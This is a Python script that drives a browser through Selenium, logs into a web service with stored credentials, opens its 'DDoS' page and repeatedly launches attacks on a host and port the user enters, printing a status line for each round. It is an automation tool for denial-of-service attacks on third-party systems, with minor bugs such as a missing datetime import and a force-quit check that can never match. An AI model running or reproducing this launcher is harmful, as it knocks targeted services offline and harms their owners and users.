from selenium import webdriver
from selenium.common.exceptions import *

import time
import traceback
from rich.console import Console
from rich.prompt import Prompt
import logging
import threading

from bot import Bot
from config import Config
from utils.presets import Presets
from utils.start import CheckInit
from utils.interface import *


CheckInit()
config = Config()


presets = Presets(driver_type=config.driver)
service, options = presets.set()

console = Console()


main_logger = logging.getLogger()
main_logger.addHandler(logging.FileHandler(config.logs["main"]))
main_logger.setLevel(logging.ERROR)


host, port = attack_info_input(config=config, console=console)
x = 0


def main():
    try:
        driver = webdriver.Chrome(service=service, options=options)
        bot = Bot(
            driver=driver,
            main_logger=main_logger,
            username=config.account["username"],
            password=config.account["password"]
            )
    except AttributeError as e:
        raise e


    class Loop:
        def __init__(self) -> None:
            self.count = 1
            self.running = False

        def start(self) -> any:
            if not self.running:
                self.running = True
                self.run()
            else:
                raise Exception("this loop is already running")

        def run(self) -> any:
            try:
                bot.start_attack(host, port, config.attack["time"], config.attack["method"])
                attack_status_output(
                    count=self.count,
                    config=config,
                    console=console,
                    style_key="bold green",
                    style_value="white",
                    attack_host=host,
                    attack_port=port,
                    eject_time=datetime.datetime.now()
                )
                time.sleep(config.attack["time"])

            finally:
                self.count = self.count + 1

        def kill(self) -> any:
            bot.driver.quit()
            self.running = False


    try:
        bot.login_form()
        bot.DDoS_page()
        bot.close_button()
    except:
        raise Exception("error al logearse")

    time.sleep(1)

    loop = Loop()
    loop.start()
    while loop.running:
        try:
            loop.run()
        except KeyboardInterrupt:
            loop.kill()
            console.print("Esperando a que termine el ataque...", style='bold red')
            force = Prompt("forzar finalización: (Y/N)", choices=["Y", "y", "N", "n"], show_choices=False)
            if force.casefold() == "Y":
                quit(1)




main()





